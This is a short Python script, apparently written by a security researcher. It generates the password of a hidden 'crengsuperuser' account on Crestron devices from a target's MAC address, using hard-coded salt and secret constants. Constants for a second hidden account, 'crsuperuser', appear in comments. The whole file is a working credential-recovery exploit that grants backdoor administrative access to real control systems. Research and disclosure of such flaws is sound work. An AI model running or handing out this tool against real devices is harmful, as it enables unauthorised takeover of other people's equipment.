#!/usr/bin/python3

""" crestron_getsudopwd.py: Simple tool to recover the 'crengsuperuser' account password"""

__author__ = 'axcheron'
__version__ = '0.1'


import argparse
import binascii
import hashlib
import string

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Constants for 'crsuperuser'
# sha_salt = "bZtB9aGX)Dyf044z"
# secret = ")7Ln1E98wA#7Vv)#"

# Constants for 'crengsuperuser'
sha_salt = b"M1Lj&54'itmLHZq#"
secret = b"Q#Jy707i7)q5y9'N"

charset = string.ascii_uppercase + string.ascii_lowercase + string.digits


def getpwd(mac_addr):

    # Validate the MAC address format
    if len(mac_addr) != 12:
        print("[-] Check your MAC address. Invalid length (should be 12 chars).")
        exit(-1)
    try:
        int(mac_addr, 16)
    except ValueError:
        print("[-] Check your MAC address. Hexadecimals only, no colons (:) or dots (.)")
        exit(-1)

    # Create SHA1 hash using the MAC address (padded with null bytes) and a salt
    sha = hashlib.sha1()
    sha.update(binascii.unhexlify(mac_addr) + b"\x00\x00")
    sha.update(sha_salt)

    # Generate RC4 cipher with the SHA1 hash as key (no IV)
    algorithm = algorithms.ARC4(sha.digest()[:16])
    cipher = Cipher(algorithm, mode=None, backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(secret)

    # Use each byte of the encrypted string to compute an
    # index for the charset and generate the password
    pasw = ""
    for b in ciphertext:
        char = b % len(charset)
        pasw += charset[char]

    print("[*] Device MAC address: %s" % mac_addr.upper())
    print("[*] Password for 'crengsuperuser': %s" % pasw)


if __name__ == "__main__":
    '''This function parses and return arguments passed in'''

    parser = argparse.ArgumentParser(
        description="Tool to generate Crestron hidden accounts passwords")

    parser.add_argument("-m", "--mac", dest="mac",
                        action="store", help="Target MAC address (w/o colons or dots)", type=str)

    args = parser.parse_args()

    if args.mac:
        getpwd(args.mac)
    else:
        parser.print_help()
        exit(-1)
